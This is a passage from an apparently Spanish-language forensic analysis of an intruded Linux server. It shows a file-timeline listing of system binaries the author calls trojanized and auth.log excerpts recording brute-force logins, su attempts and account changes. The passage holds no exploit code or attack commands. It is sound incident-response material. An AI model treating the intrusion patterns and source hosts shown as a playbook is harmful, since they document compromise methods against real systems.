Fri Apr 11 2003 21:13:30      240 m.c -/-rwxr-xr-x root     root     227250   /usr/bin/weit
Fri Apr 11 2003 21:13:58    39925 m.c -/-rwxr-xr-x root     root     241500   /bin/lspci
                            22157 m.c -/-rwxr-xr-x root     root     241496   /bin/mt-gnu
                            21701 m.c -/-rwxr-xr-x root     root     241522   /bin/mknod
                             9697 m.c -/-rwxr-xr-x root     root     241491   /bin/arch
                            53417 m.c -/-rwxr-xr-x root     root     241460   /bin/grep
                            22837 m.c -/-rwxr-xr-x duende  users    501288   /bin/ps
                            17817 m.c -/-rwxr-xr-x root     root     241481   /bin/echo
                            24869 m.c -/-rwxr-xr-x root     root     241458   /bin/chown
                           135637 m.c -/-rwxr-xr-x root     root     241489   /bin/tar
                            11049 m.c -/-rwxr-xr-x root     root     241492   /bin/dmesg
                            15929 m.c -/-rwxr-xr-x root     root     241486   /bin/true
                            22789 m.c -/-rwxr-xr-x root     root     241457   /bin/chmod
                            16757 m.c -/-rwxr-xr-x root     root     241471   /bin/hostname
                            15929 m.c -/-rwxr-xr-x root     root     241482   /bin/false
                            26009 m.c -/-rwxr-xr-x root     root     241502   /bin/fuser
                            30149 m.c -/-rwxr-xr-x root     root     241528   /bin/touch
                            18421 m.c -/-rwxr-xr-x root     root     241478   /bin/kill
                            77077 m.c -/-rwsr-xr-x root     root     241475   /bin/mount
                            50265 m.c -/-rwxr-xr-x root     root     241497   /bin/ed
                            16757 m.c -/-rwxr-xr-x root     root     241472   /bin/dnsdomainname
                            32325 m.c -/-rwxr-xr-x root     root     241524   /bin/rm
                            12481 m.c -/-rwxr-xr-x root     root     241514   /bin/tempfile
                            55817 m.c -/-rwxr-xr-x root     root     241463   /bin/uncompress
                            50757 m.c -/-rwxr-xr-x root     root     241520   /bin/ls
                            55817 m.c -/-rwxr-xr-x root     root     241463   /bin/zcat
                            20705 m.c -/-rwxr-xr-x root     root     243666   /bin/getty
                            41753 m.c -/-rwxr-xr-x root     root     241494   /bin/loadkeys
                            28105 m.c -/-rwxr-xr-x root     root     241479   /bin/sed
                            34309 m.c -/-rwxr-xr-x root     root     241516   /bin/dd
                            20705 m.c -/-rwxr-xr-x root     root     243666   /var/lib/nfs/sm/
                                                                              xxx.xxx.xxx.2 
                                                                              (deleted-realloc)
                            16229 m.c -/-rwxr-xr-x root     root     241527   /bin/sync
                           718863 m.c -/-rwxr-xr-x duende  users    227355   /bin/sysinit
                            22217 m.c -/-rwsr-xr-x root     root     241499   /bin/ping
                            55817 m.c -/-rwxr-xr-x root     root     241463   /bin/gzip
                            32549 m.c -/-rwxr-xr-x root     root     241517   /bin/df
                            56065 m.c -/-rwxr-xr-x root     root     241495   /bin/cpio
                            50757 m.c -/-rwxr-xr-x root     root     241518   /bin/dir
                            26045 m.c -/-rwxr-xr-x root     root     241501   /bin/setserial
                            11941 m.c -/-rwxr-xr-x root     root     241515   /bin/mktemp
                            41957 m.c -/-rwsr-xr-x root     root     241473   /bin/login
                            49061 m.c -/-rwxr-xr-x root     root     241523   /bin/mv
                            23493 m.c -/-rwxr-xr-x root     root     241521   /bin/mkdir
                            17477 m.c -/-rwxr-xr-x root     root     241525   /bin/rmdir
                            16281 m.c -/-rwxr-xr-x root     root     241490   /bin/cat
                            22949 m.c -/-rwxr-xr-x root     root     241456   /bin/chgrp
                            30149 m.c -/-rwsr-xr-x root     root     241474   /bin/su
                            16889 m.c -/-rwxr-xr-x root     root     241483   /bin/pwd
                            26501 m.c -/-rwxr-xr-x root     root     241519   /bin/ln
                            32793 m.c -/-rwxr-xr-x root     root     241480   /bin/date
                            53417 m.c -/-rwxr-xr-x root     root     241462   /bin/fgrep
                            55817 m.c -/-rwxr-xr-x root     root     241463   /bin/gunzip
                            50757 m.c -/-rwxr-xr-x root     root     241526   /bin/vdir
                            43925 m.c -/-rwsr-xr-x root     root     241476   /bin/umount
                            30933 m.c -/-rwxr-xr-x root     root     241493   /bin/more
                            41637 m.c -/-rwxr-xr-x root     root     241459   /bin/cp
                            10649 m.c -/-rwxr-xr-x root     root     241453   /bin/readlink
                            16465 m.c -/-rwxr-xr-x root     root     241455   /bin/run-parts
                            22837 m.c -/-rwxr-xr-x duende  users    501291   /bin/netstat
                            18105 m.c -/-rwxr-xr-x root     root     241484   /bin/sleep
                            36953 m.c -/-rwxr-xr-x root     root     241485   /bin/stty
                            15921 m.c -/-rwxr-xr-x root     root     483037   /sbin/killall5
                            17369 m.c -/-rwxr-xr-x root     root     241487   /bin/uname
                            53417 m.c -/-rwxr-xr-x root     root     241461   /bin/egrep
Fri Apr 11 2003 21:18:44    44677 m.c -/-rwxr-xr-x root     root     225480   /usr/bin/install
                            15741 m.c -/-rwxr-xr-x root     root     225483   /usr/bin/locate
                            35877 m.c -/-rwxr-xr-x root     root     225601   /usr/bin/shred
                            40421 m.c -/-rwxr-xr-x root     root     482933   /sbin/genksyms
                            11341 m.c -/-rwxr-xr-x root     root     225500   /usr/bin/renice
                            52089 m.c -/-rwxr-xr-x root     root     225481   /usr/bin/find
                            39077 m.c -/-rwxr-sr-x root     shadow   225511   /usr/bin/chage
                           148385 m.c -/-rwxr-xr-x root     root     225470   /usr/bin/dselect
                           101977 m.c -/-rwxr-xr-x root     root     225477   /usr/bin/mawk
                            22361 m.c -/-rwxr-xr-x root     root     225466   /usr/bin/diff3
                           146949 m.c -/-rwxr-xr-x root     root     225507   /usr/bin/tack
                            14677 m.c -/-rwxr-xr-x root     root     225499   /usr/bin/logger
                            24005 m.c -/-rwxr-xr-x root     root     225471   /usr/bin/md5sum
                            20857 m.c -/-rwxr-xr-x root     root     225467   /usr/bin/sdiff
                            31397 m.c -/-rwxr-xr-x root     root     225479   /usr/bin/du
                            10077 m.c -/-rwxr-xr-x root     root     225607   /usr/bin/clear
                            14245 m.c -/-rwxr-xr-x root     root     225474   /usr/bin/faillog
                            16085 m.c -/-rwxr-sr-x root     tty      225501   /usr/bin/wall
                            12569 m.c -/-rwxr-xr-x root     root     225504   /usr/bin/lsattr
                            16309 m.c -/-rwxr-xr-x root     root     225464   /usr/bin/cmp
                            33733 m.c -/-rwxr-xr-x root     root     225506   /usr/bin/toe
                            15261 m.c -/-rwxr-xr-x root     root     225508   /usr/bin/tput
                            19493 m.c -/-rwxr-xr-x root     root     225527   /usr/bin/mkfifo
                            13657 m.c -/-rwxr-xr-x root     root     225503   /usr/bin/chattr
                            26021 m.c -/-rwsr-xr-x root     root     225473   /usr/bin/newgrp
                            38309 m.c -/-rwxr-xr-x root     root     225510   /usr/bin/tset
                            69017 m.c -/-rwxr-xr-x root     root     225465   /usr/bin/diff
                            12389 m.c -/-rwxr-xr-x root     root     225475   /usr/bin/lastlog
                            22909 m.c -/-rwxr-xr-x root     root     225576   /usr/bin/whiptail
                            32837 m.c -/-rwsr-xr-x root     root     225512   /usr/bin/chfn
                            44525 m.c -/-rwxr-xr-x root     root     225505   /usr/bin/tic
                            18137 m.c -/-rwxr-xr-x root     root     225482   /usr/bin/xargs
                            16517 m.c -/-rwxr-xr-x root     root     225604   /usr/bin/link
                            10553 m.c -/-rwxr-xr-x root     root     225509   /usr/bin/uuidgen
                            14261 m.c -/-rwxr-xr-x root     root     225459   /usr/bin/script
                            16421 m.c -/-rwxr-xr-x root     root     225603   /usr/bin/unlink
                            48549 m.c -/-rwxr-xr-x root     root     225608   /usr/bin/infocmp
Fri Apr 11 2003 21:18:45    17785 m.c -/-rwxr-xr-x root     root     225623   /usr/bin/users
                            14677 m.c -/-rwxr-xr-x root     root     225542   /usr/bin/comm
                            31653 m.c -/-rwsr-xr-x root     root     225516   /usr/bin/passwd
                            31717 m.c -/-rwxr-xr-x root     root     225543   /usr/bin/csplit
                            28837 m.c -/-rwxr-xr-x root     root     225551   /usr/bin/od
                            32837 m.c -/-rwxr-xr-x root     root     225555   /usr/bin/sort
                            20025 m.c -/-rwxr-xr-x root     root     225533   /usr/bin/id
                            16869 m.c -/-rwxr-xr-x root     root     225610   /usr/bin/pkill
                            18905 m.c -/-rwxr-xr-x root     root     225621   /usr/bin/nice
                            16741 m.c -/-rwxr-xr-x root     root     225548   /usr/bin/head
                            31245 m.c -/-rwxr-xr-x root     root     225553   /usr/bin/pr
                            16869 m.c -/-rwxr-xr-x root     root     225610   /usr/bin/pgrep
                            22837 m.c -/-rwxr-xr-x duende  users    501289   /usr/bin/top
                            17305 m.c -/-rwxr-xr-x root     root     225530   /usr/bin/env
                            27065 m.c -/-rwxr-xr-x root     root     225616   /usr/bin/test
                            22577 m.c -/-rwxr-xr-x root     root     225549   /usr/bin/join
                            30917 m.c -/-rwsr-xr-x root     root     225513   /usr/bin/chsh
                            40037 m.c -/-rwsr-xr-x root     root     225515   /usr/bin/gpasswd
                            23449 m.c -/-rwxr-xr-x root     root     225531   /usr/bin/expr
                            18109 m.c -/-rwxr-xr-x root     root     225539   /usr/bin/last
                            17049 m.c -/-rwxr-xr-x root     root     225528   /usr/bin/basename
                            10277 m.c -/-rwxr-xr-x root     root     225521   /usr/bin/uptime
                            16697 m.c -/-rwxr-xr-x root     root     225618   /usr/bin/whoami
                            18113 m.c -/-rwxr-xr-x root     root     225544   /usr/bin/cut
                            16505 m.c -/-rwxr-xr-x root     root     225620   /usr/bin/hostid
                            18421 m.c -/-rwxr-xr-x root     root     225494   /usr/bin/skill
                            23865 m.c -/-rwxr-xr-x root     root     225624   /usr/bin/who
                            17081 m.c -/-rwxr-xr-x root     root     225529   /usr/bin/dirname
Fri Apr 11 2003 21:19:00    12709 m.c -/-rwxr-xr-x root     root     225644   /usr/bin/setkeycodes
                            22837 m.c -/-rwxr-xr-x duende  users    501292   /usr/bin/pstree
                            20449 m.c -/-rwxr-xr-x root     root     225714   /usr/bin/killall
                            12697 m.c -/-rwxr-xr-x root     root     225647   /usr/bin/showcfont
                           322293 m.c -/-rwxr-xr-x root     root     225703   /usr/bin/nview
Fri Apr 11 2003 21:19:01   171705 m.c -/-rwxr-xr-x root     root     225771   /usr/bin/readelf
                           121573 m.c -/-rwxr-xr-x root     root     225809   /usr/bin/make
                            11601 m.c -/-rwxr-xr-x root     root     225861   /usr/bin/lessecho
                            70421 m.c -/-rwxr-xr-x root     root     225829   /usr/bin/netkit-ftp
                            58309 m.c -/-rwxr-xr-x root     root     225763   /usr/bin/host
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm			    

La muestra es meramente representativa de varios cientos de archivos
modificados y/o creados el 11 de abril a partir de las 20:55:02. Es
evidente que muchos programas fueron modificados/creados en ese
momento. Las marcas de tiempo nos dicen que a esta hora fueron
troyanizados/creados gran parte de los programas y archivos esenciales
para el funcionamiento del equipo. Los archivos propiedad de duende
est'an entre los programas modificados/creados y se muestran arriba.


\subsection*{Revisi'on de las bit'acoras del sistema}

Las salidas est'an resumidas a lo mas esencial, algunas l'ineas se
repiten cientos de veces pero solo se mostraran tres o cuatro veces
para mostrar que son recurrentes.\\


\verb+auth.log+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Apr  8 05:23:01 victima1 PAM_unix[1157]: (cron) session closed for user mail
Apr  8 05:29:22 victima1 sshd[1232]: Did not receive identification string from 200.161.199.225
Apr  8 05:30:20 victima1 PAM_unix[1234]: check pass; user unknown
Apr  8 05:30:20 victima1 PAM_unix[1234]: authentication failure; (uid=0) -> **unknown** for login service
Apr  8 05:30:22 victima1 login[1234]: FAILED LOGIN (1) on `pts/2' from `200-161-199-225.dsl.telesp.net.br' 
				     FOR `UNKNOWN', Authentication servic
Apr  8 05:30:29 victima1 PAM_unix[1234]: (login) session opened for user proa by (uid=0)
Apr  8 05:31:37 victima1 newgrp[1242]: unknown gid: 523
Apr  8 05:31:45 victima1 newgrp[1247]: unknown gid: 523
Apr  8 05:31:56 victima1 passwd[1252]: can't change pwd for `root'
Apr  8 05:33:02 victima1 PAM_unix[1262]: (login) session opened for user proa by (uid=0)
Apr  8 05:33:52 victima1 newgrp[1287]: unknown gid: 523
Apr  8 05:34:58 victima1 passwd[4388]: can't change pwd for `root'
Apr  8 05:35:19 victima1 newgrp[4391]: unknown gid: 523
Apr  8 05:35:26 victima1 newgrp[4394]: unknown gid: 523
Apr  8 05:36:23 victima1 PAM_unix[4402]: (login) session opened for user proa by (uid=0)
Apr  8 05:36:49 victima1 PAM_unix[4404]: authentication failure; proa(uid=523) -> irc for su service
Apr  8 05:36:51 victima1 su[4404]: pam_authenticate: Authentication failure
Apr  8 05:36:51 victima1 su[4404]: - pts/5 proa-irc
Apr  8 05:37:30 victima1 newgrp[4416]: unknown gid: 523
Apr  8 05:38:01 victima1 PAM_unix[4430]: (cron) session opened for user mail by (uid=0)
Apr  8 05:41:54 victima1 newgrp[4570]: unknown gid: 523
Apr  8 05:43:05 victima1 PAM_unix[4588]: (login) session opened for user proa by (uid=0)
Apr  8 10:04:22 victima1 PAM_unix[7098]: (login) session opened for user apached by (uid=0)
Apr  8 10:04:32 victima1 PAM_unix[7099]: authentication failure; apached(uid=1) -> smtpd for su service
Apr  8 10:04:34 victima1 su[7099]: pam_authenticate: Authentication failure
Apr  8 10:04:34 victima1 su[7099]: - pts/11 apached-smtpd
Apr  8 10:06:14 victima1 PAM_unix[31115]: (gdm) session closed for user stevens
Apr  8 10:06:28 victima1 PAM_unix[7118]: (login) session opened for user lester by (uid=0)
Apr  8 10:06:46 victima1 PAM_unix[7103]: authentication failure; apached(uid=1) -> smtpd for su service
Apr  8 10:06:48 victima1 su[7103]: pam_authenticate: Authentication failure
Apr  8 10:06:48 victima1 su[7103]: - pts/11 apached-smtpd
Apr  8 10:06:59 victima1 passwd[7120]: can't change pwd for `smtpd'
Apr  8 10:07:05 victima1 PAM_unix[7121]: authentication failure; apached(uid=1) -> smtpd for su service
Apr  8 10:07:07 victima1 su[7121]: pam_authenticate: Authentication failure
Apr  8 10:07:07 victima1 su[7121]: - pts/11 apached-smtpd
Apr  8 10:07:23 victima1 PAM-securetty[7123]: access denied: tty 'pts/7' is not secure!
Apr  8 10:07:27 victima1 login[7123]: FAILED LOGIN (1) on `pts/7' from `130.205.88.45' FOR `smtpd', 
			Authentication failure
Apr  8 10:07:56 victima1 PAM_unix[7128]: Password for apached was changed
Apr  8 10:08:00 victima1 PAM_unix[7129]: Password for smtpd was changed
Apr  8 10:08:01 victima1 PAM_unix[7130]: (cron) session opened for user mail by (uid=0)
Apr  8 10:08:01 victima1 PAM_unix[7130]: (cron) session closed for user mail
Apr  8 10:08:36 victima1 PAM_unix[7207]: (login) session opened for user apached by (uid=0)
Apr  8 10:08:39 victima1 su[7208]: + pts/7 apached-smtpd
Apr  8 10:08:39 victima1 PAM_unix[7208]: (su) session opened for user smtpd by apached(uid=1)
Apr  8 10:09:49 victima1 sshd[7226]: Bad protocol version identification '\233�^]W�\215/5^O\2027Do\226\
			F^_"��' from 130.205.88.45
Apr  8 10:10:15 victima1 PAM_unix[7228]: (login) session opened for user apached by (uid=0)
Apr  8 10:10:18 victima1 su[7229]: + pts/2 apached-smtpd
Apr  8 10:10:18 victima1 PAM_unix[7229]: (su) session opened for user smtpd by apached(uid=1)
Apr  8 14:08:44 victima1 PAM_unix[9147]: (login) session opened for user zopilote by (uid=0)
Apr  8 14:11:36 victima1 sshd[9228]: Accepted password for root from xxx.xxx.xxx.14 port 32769 ssh2
Apr  8 14:11:36 victima1 PAM_unix[9228]: (ssh) session opened for user root by (uid=0)
Apr  8 14:13:02 victima1 PAM_unix[9228]: (ssh) session closed for user root
Apr  8 14:13:02 victima1 sshd[9228]: PAM pam_putenv: delete non-existent entry; MAIL
Apr  8 14:23:01 victima1 PAM_unix[9298]: (cron) session opened for user mail by (uid=0)
Apr  8 14:23:02 victima1 PAM_unix[9298]: (cron) session closed for user mail
Apr  8 14:33:15 victima1 PAM_unix[9372]: (ftp) session opened for user proa by (uid=0)
Apr  8 14:38:01 victima1 PAM_unix[9378]: (cron) session opened for user mail by (uid=0)
Apr  8 14:38:02 victima1 PAM_unix[9378]: (cron) session closed for user mail
Apr  8 14:40:41 victima1 PAM_unix[9372]: (ftp) session closed for user proa
Apr  8 14:48:23 victima1 PAM_unix[9465]: (ftp) session opened for user proa by (uid=0)
Apr  8 14:49:12 victima1 PAM_unix[9465]: (ftp) session closed for user proa
Apr  8 14:50:03 victima1 PAM_unix[9467]: (ftp) session opened for user proa by (uid=0)
Apr  8 14:51:33 victima1 PAM_unix[9467]: (ftp) session closed for user proa
Apr  8 14:53:01 victima1 PAM_unix[9471]: (cron) session opened for user mail by (uid=0)
Apr  8 14:53:02 victima1 PAM_unix[9471]: (cron) session closed for user mail
Apr  8 14:54:07 victima1 PAM_unix[31115]: (gdm) session opened for user stevens by (uid=0)
Apr  8 14:54:48 victima1 PAM_unix[9545]: authentication failure; (uid=0) -> proa for ftp service
Apr  8 14:55:12 victima1 PAM_unix[9613]: (ftp) session opened for user proa by (uid=0)
Apr  8 14:58:10 victima1 PAM_unix[9613]: (ftp) session closed for user proa
Apr  8 15:57:45 victima1 PAM_unix[9967]: (login) session opened for user proa by (uid=0)
Apr  8 16:00:40 victima1 ftpd[10008]: PAM-listfile: Refused user anonymous for service ftp
Apr  8 16:00:40 victima1 ftpd[10009]: PAM-listfile: Refused user ftp for service ftp
Apr  8 16:00:41 victima1 PAM_unix[10012]: check pass; user unknown
Apr  8 16:00:41 victima1 PAM_unix[10012]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:41 victima1 PAM_unix[10008]: auth could not identify password for [ftp]
Apr  8 16:00:41 victima1 PAM_unix[10009]: auth could not identify password for [ftp]
Apr  8 16:00:44 victima1 PAM_unix[10013]: check pass; user unknown
Apr  8 16:00:44 victima1 PAM_unix[10013]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:44 victima1 PAM_unix[10014]: check pass; user unknown
Apr  8 16:00:44 victima1 PAM_unix[10014]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:45 victima1 PAM_unix[10010]: check pass; user unknown
Apr  8 16:00:45 victima1 PAM_unix[10010]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:45 victima1 PAM_unix[10011]: check pass; user unknown
Apr  8 16:00:45 victima1 PAM_unix[10011]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:49 victima1 PAM_unix[10015]: check pass; user unknown
Apr  8 16:00:49 victima1 PAM_unix[10015]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:49 victima1 PAM_unix[10016]: check pass; user unknown
Apr  8 16:00:49 victima1 PAM_unix[10016]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:49 victima1 PAM_unix[10017]: check pass; user unknown
Apr  8 16:00:49 victima1 PAM_unix[10017]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:50 victima1 PAM_unix[10018]: check pass; user unknown
Apr  8 16:00:50 victima1 PAM_unix[10018]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:50 victima1 PAM_unix[10019]: check pass; user unknown
Apr  8 16:00:50 victima1 PAM_unix[10019]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:56 victima1 PAM_unix[10020]: check pass; user unknown
Apr  8 16:00:56 victima1 PAM_unix[10020]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:56 victima1 PAM_unix[10021]: check pass; user unknown
Apr  8 16:00:56 victima1 PAM_unix[10021]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:56 victima1 ftpd[10023]: PAM-listfile: Refused user anonymous for service ftp
Apr  8 16:00:56 victima1 ftpd[10024]: PAM-listfile: Refused user ftp for service ftp
Apr  8 16:00:56 victima1 ftpd[10025]: PAM-listfile: Refused user root for service ftp
Apr  8 16:00:57 victima1 PAM_unix[10023]: auth could not identify password for [ftp]
Apr  8 16:00:57 victima1 PAM_unix[10024]: auth could not identify password for [ftp]
Apr  8 16:00:57 victima1 PAM_unix[10025]: authentication failure; (uid=0) -> root for ftp service
Apr  8 16:00:57 victima1 PAM_unix[10027]: authentication failure; (uid=0) -> daemon for ftp service
Apr  8 16:00:57 victima1 PAM_unix[10028]: check pass; user unknown
Apr  8 16:00:57 victima1 PAM_unix[10028]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:00:57 victima1 PAM_unix[10029]: bad username [�kim]
Apr  8 16:01:00 victima1 PAM_unix[10026]: authentication failure; (uid=0) -> bin for ftp service
Apr  8 16:01:00 victima1 PAM_unix[10031]: authentication failure; (uid=0) -> games for ftp service
Apr  8 16:01:00 victima1 PAM_unix[10030]: authentication failure; (uid=0) -> lp for ftp service
Apr  8 16:01:01 victima1 PAM_unix[10032]: check pass; user unknown
Apr  8 16:01:01 victima1 PAM_unix[10032]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:02 victima1 PAM_unix[10033]: check pass; user unknown
Apr  8 16:01:02 victima1 PAM_unix[10033]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:02 victima1 PAM_unix[10035]: check pass; user unknown
Apr  8 16:01:02 victima1 PAM_unix[10035]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:03 victima1 PAM_unix[10037]: check pass; user unknown
Apr  8 16:01:03 victima1 PAM_unix[10037]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:03 victima1 PAM_unix[10036]: check pass; user unknown
Apr  8 16:01:03 victima1 PAM_unix[10036]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:03 victima1 PAM_unix[10038]: authentication failure; (uid=0) -> postgres for ftp service
Apr  8 16:01:05 victima1 PAM_unix[10040]: check pass; user unknown
Apr  8 16:01:05 victima1 PAM_unix[10040]: authentication failure; (uid=0) -> **unknown** for ftp service
Apr  8 16:01:05 victima1 PAM_unix[10034]: check pass; user unknown
Apr  9 06:25:01 victima1 PAM_unix[16510]: (cron) session opened for user root by (uid=0)
Apr  9 06:25:02 victima1 su[16579]: + ??? root-nobody
Apr  9 06:25:02 victima1 PAM_unix[16579]: (su) session opened for user nobody by (uid=0)
Apr  9 06:29:35 victima1 PAM_unix[16510]: (cron) session closed for user root
Apr 12 20:44:38 victima1 passwd[19695]: password for `mail' changed by `root'
Apr 12 20:44:46 victima1 userdel[19700]: delete user `smtpd'
Apr 16 12:19:54 victima1 PAM_unix[18346]: authentication failure; (uid=0) -> proa for login service
Apr 16 12:19:57 victima1 login[18346]: FAILED LOGIN (1) on `pts/6' from 
					`host-200.77.149.186-cust.telemedia.net.mx' FOR `proa', 
					Authentication
Apr 16 12:20:07 victima1 login[18346]: FAILED LOGIN (2) on `pts/6' from 
					`host-200.77.149.186-cust.telemedia.net.mx' FOR `proa', 
					Authentication
Apr 16 12:20:19 victima1 PAM_unix[18346]: authentication failure; (uid=0) -> zopilote for login service
Apr 16 12:20:21 victima1 login[18346]: FAILED LOGIN (3) on `pts/6' from 
					`host-200.77.149.186-cust.telemedia.net.mx' FOR `zopilote', 
					Authenticat
Apr 16 12:20:39 victima1 PAM_unix[18349]: authentication failure; (uid=0) -> brenton for login service
Apr 16 12:20:42 victima1 login[18349]: FAILED LOGIN (1) on `pts/6' from `test.foo.bar.mx' FOR `brenton', 
					Authentication failure
Apr 16 12:20:48 victima1 PAM_unix[18352]: authentication failure; (uid=0) -> zena for login service
Apr 16 12:20:52 victima1 login[18352]: FAILED LOGIN (1) on `pts/7' from 
					`host-200.77.149.186-cust.telemedia.net.mx' FOR `zena', 
					Authentication
Apr 16 12:20:53 victima1 PAM_unix[18349]: (login) session opened for user guest by (uid=0)
Apr 16 12:20:57 victima1 PAM_unix[18352]: check pass; user unknown
Apr 16 12:20:57 victima1 PAM_unix[18352]: authentication failure; (uid=0) -> **unknown** for login service
Apr 16 12:21:00 victima1 login[18352]: FAILED LOGIN (2) on `pts/7' from 
					`host-200.77.149.186-cust.telemedia.net.mx' FOR `UNKNOWN', 
					Authentication
Apr 16 12:21:37 victima1 PAM_unix[18354]: authentication failure; (uid=0) -> proa for ssh service
Apr 16 12:21:39 victima1 sshd[18354]: Failed password for proa from 200.77.149.186 port 1127 ssh2
Apr 16 12:36:25 victima1 PAM_unix[18490]: (login) session opened for user proa by (uid=0)
Apr 16 12:36:39 victima1 PAM_unix[18492]: Password for proa was changed
Apr 16 14:08:02 victima1 PAM_unix[19069]: (cron) session closed for user mail
Apr 16 14:11:19 victima1 sshd[19150]: Accepted password for root from xxx.xxx.xxx.89 port 32779 ssh2
Apr 16 14:11:20 victima1 PAM_unix[19150]: (ssh) session opened for user root by (uid=0)
Apr 16 14:11:52 victima1 su[19159]: + pts/6 root-zopilote
Apr 16 14:11:52 victima1 PAM_unix[19159]: (su) session opened for user zopilote by root(uid=0)
Apr 16 14:56:07 victima1 sshd[1543]: Accepted password for zena from 200.77.148.78 port 1388 ssh2
Apr 16 14:56:08 victima1 PAM_unix[1545]: (ssh) session opened for user zena by (uid=521)
Apr 16 14:57:16 victima1 PAM_unix[1545]: (ssh) session closed for user zena
Apr 16 14:57:16 victima1 sshd[1545]: PAM pam_putenv: delete non-existent entry; MAIL
Apr 16 15:22:05 victima1 sshd[2293]: Accepted password for duende from xxx.xxx.xxx.2 port 32870 ssh2
Apr 16 15:22:05 victima1 PAM_unix[2295]: (ssh) session opened for user duende by (uid=500)
Apr 16 15:23:01 victima1 PAM_unix[2313]: (cron) session opened for user mail by (uid=0)
Apr 16 15:23:02 victima1 PAM_unix[2313]: (cron) session closed for user mail
Apr 16 15:26:54 victima1 PAM_unix[2295]: (ssh) session closed for user duende
Apr 16 15:26:54 victima1 sshd[2295]: PAM pam_putenv: delete non-existent entry; MAIL
Apr 16 15:30:37 victima1 sshd[2442]: Accepted password for duende from xxx.xxx.xxx.2 port 32871 ssh2
Apr 16 15:30:37 victima1 PAM_unix[2444]: (ssh) session opened for user duende by (uid=500)
Apr 16 15:34:00 victima1 PAM_unix[2444]: (ssh) session closed for user duende
Apr 21 11:07:20 victima1 PAM_unix[14410]: authentication failure; (uid=0) -> proa for ftp service
Apr 21 11:07:41 victima1 PAM_unix[14411]: authentication failure; (uid=0) -> proa for ftp service
Apr 21 11:08:01 victima1 PAM_unix[14413]: (cron) session opened for user mail by (uid=0)
Apr 21 11:08:01 victima1 PAM_unix[14413]: (cron) session closed for user mail
Apr 21 11:08:06 victima1 PAM_unix[14412]: authentication failure; (uid=0) -> proa for ftp service
Apr 21 11:08:58 victima1 PAM_unix[14490]: (login) session opened for user zena by (uid=0)
Apr 21 11:09:12 victima1 PAM_unix[14500]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:09:14 victima1 su[14500]: pam_authenticate: Authentication failure
Apr 21 11:09:14 victima1 su[14500]: - pts/2 zena-proa
Apr 21 11:09:24 victima1 PAM_unix[14503]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:09:26 victima1 su[14503]: pam_authenticate: Authentication failure
Apr 21 11:09:26 victima1 su[14503]: - pts/2 zena-proa
Apr 21 11:09:32 victima1 PAM_unix[14505]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:09:34 victima1 su[14505]: pam_authenticate: Authentication failure
Apr 21 11:09:34 victima1 su[14505]: - pts/2 zena-proa
Apr 21 11:09:41 victima1 PAM_unix[14507]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:09:43 victima1 su[14507]: pam_authenticate: Authentication failure
Apr 21 11:09:43 victima1 su[14507]: - pts/2 zena-proa
Apr 21 11:10:30 victima1 PAM_unix[14517]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:10:32 victima1 su[14517]: pam_authenticate: Authentication failure
Apr 21 11:10:32 victima1 su[14517]: - pts/2 zena-proa
Apr 21 11:10:40 victima1 PAM_unix[14519]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:10:42 victima1 su[14519]: pam_authenticate: Authentication failure
Apr 21 11:10:42 victima1 su[14519]: - pts/2 zena-proa
Apr 21 11:11:01 victima1 PAM_unix[14529]: authentication failure; zena(uid=521) -> elisa for su service
Apr 21 11:11:03 victima1 su[14529]: pam_authenticate: Authentication failure
Apr 21 11:11:03 victima1 su[14529]: - pts/2 zena-elisa
Apr 21 11:11:11 victima1 PAM_unix[14531]: authentication failure; zena(uid=521) -> proa for su service
Apr 21 11:11:14 victima1 su[14531]: pam_authenticate: Authentication failure
Apr 21 11:11:14 victima1 su[14531]: - pts/2 zena-proa
Apr 21 11:15:33 victima1 PAM_unix[14534]: authentication failure; (uid=0) -> zopilote for login service
Apr 21 11:15:37 victima1 login[14534]: FAILED LOGIN (1) on `pts/1' from 
				`dup-200-64-234-196.prodigy.net.mx' FOR `zopilote', 
				Authentication fail
Apr 21 11:15:48 victima1 login[14534]: FAILED LOGIN (2) on `pts/1' from 
				`dup-200-64-234-196.prodigy.net.mx' FOR `zopilote', Authentication fail
Apr 21 11:15:58 victima1 PAM_unix[14534]: authentication failure; (uid=0) -> zena for login service
Apr 21 11:16:02 victima1 login[14534]: FAILED LOGIN (3) on `pts/1' from 
				`dup-200-64-234-196.prodigy.net.mx' FOR `zena', Authentication failure
Apr 21 11:16:07 victima1 PAM_unix[14534]: (login) session opened for user zena by (uid=0)
Apr 21 11:17:28 victima1 passwd[14564]: can't change pwd for `bin'
Apr 21 11:17:33 victima1 passwd[14566]: can't change pwd for `proa'
Apr 21 11:17:50 victima1 newgrp[14569]: unknown gid: 521
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

\verb+daemon.log+


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Apr  8 02:28:50 victima1 identd[32667]: started
